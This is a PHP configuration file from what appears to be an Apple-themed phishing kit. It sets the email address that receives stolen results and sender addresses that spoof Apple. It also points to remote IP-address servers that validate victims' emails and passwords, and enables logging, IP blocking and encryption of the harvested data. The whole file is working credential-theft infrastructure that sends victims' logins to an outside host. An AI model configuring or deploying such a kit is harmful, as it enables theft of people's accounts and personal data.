<?php
/*
 ****** FUNCTION CONTROL: 1=ON  and 0=OFF ******
 $Example = 1; // Function On
 $Example = 0; // Function Off
 ****** True Login Mode ******
 0 = True Login not active
 1 = True Login active by checking email valid or not
 2 = True Login active by checking email and password and get the address then auto complete form on Verification page
*/
$Your_Email      = "pinkjp@yandex.com"; // Set your email
$From_CC    = "PinkM0n3y@CC.id";
$From_Address    = "rezultz@appl3.tru3login.com"; // Address your results will apear to come from
$From_Address1   = "login@appl3.tru3login.com"; // Address your results will apear to come from	
$True_Login      = 2; // True login mode
$URL_True_Login  = "http://198.46.152.193/sayang/indexmulti.php";//"http://23.94.249.237/newapple/index.php";
$URL_Valid		 = "http://23.94.249.237/apple/valid.php";
$Send_Log        = 1; // Send email results
$Save_Log        = 0; // Saves results to server (./assets/logs/)
$Abuse_Filter    = 1; // Block absuive text 
$One_Time_Access = 1; // Blocks the users ip after the form has been submitted i.e. prevents users sending multiple fake forms
$EncryptScript   = 0; // This will make html source encrypt maybe slow open
$Encrypt         = 0; // This will send/save your results with aes to decrypt use the key below
$Key             = "MoreArt"; // This key is used to decrypt results and can be changed
$Send_Per_Page   = 1; // Send each pages data seperate
?>